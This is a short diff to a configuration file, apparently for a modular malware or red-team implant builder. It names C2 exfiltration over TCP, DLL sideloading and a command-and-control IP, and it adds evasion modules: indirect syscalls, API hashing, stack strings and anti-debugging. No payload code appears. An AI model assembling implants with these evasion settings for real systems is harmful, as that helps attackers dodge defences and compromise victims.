@@ -19,9 +19,15 @@ exfil: exfil/tcp_direct
 arch: arch/dll_sideload
 def_file: version.def
 
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+
 evasion:
+  - evasion/indirect_syscall
   - evasion/behavioral_pacing
   - evasion/entropy_pad
+  - evasion/stack_strings
+  - evasion/anti_debug
 
 vars:
   C2_IP: "10.0.2.2"
